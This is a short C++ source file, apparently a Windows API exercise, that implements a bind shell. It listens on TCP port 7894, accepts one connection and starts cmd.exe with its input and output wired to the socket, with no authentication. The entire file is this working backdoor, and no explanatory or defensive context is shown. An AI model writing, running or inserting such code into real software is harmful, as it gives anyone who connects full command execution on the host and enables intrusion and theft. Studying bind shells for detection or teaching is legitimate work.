/* *
 * Windows API Tests - remote bind shell
 * */

#include <ws2tcpip.h>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ws2_32.lib") // link ws2_32.dll

#define MY_PORT "7894"
#define MY_BUFLEN 1024


int main(int argc, char **argv)
{
    WSADATA version;
    WSAStartup(MAKEWORD(2, 2), &version);

    struct addrinfo *result = nullptr, hints = {0};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    getaddrinfo(nullptr, MY_PORT, &hints, &result);

    SOCKET listen_sock = WSASocketW(result->ai_family, result->ai_socktype, result->ai_protocol, nullptr, (unsigned int)NULL, (unsigned int)NULL);
    bind(listen_sock, result->ai_addr, (int)result->ai_addrlen);
    listen(listen_sock, SOMAXCONN);

    //sockaddr_in client;
    SOCKET remote_sock = WSAAccept(listen_sock, nullptr, nullptr, nullptr, 0);

    char Process[] = "cmd.exe";

    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)remote_sock;

    CreateProcess(nullptr, Process, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    
    closesocket(listen_sock);
    WSACleanup();
    return 0;
}